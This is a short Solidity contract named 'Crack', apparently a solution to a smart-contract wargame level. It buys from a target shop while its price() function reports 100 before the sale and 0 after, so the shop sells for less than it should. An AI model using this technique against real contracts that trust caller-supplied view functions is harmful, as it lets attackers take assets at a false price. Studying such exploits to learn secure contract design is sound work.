pragma solidity ^0.6.0;

interface Target {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Crack {
    uint currentPrice = 101;

    Target target;

    constructor (address _target) public {
        target = Target(_target);
    }

    function crack() external {
        target.buy();
    }

    function price() external view returns (uint) {
        return target.isSold() ? 0 : 100;
    }
}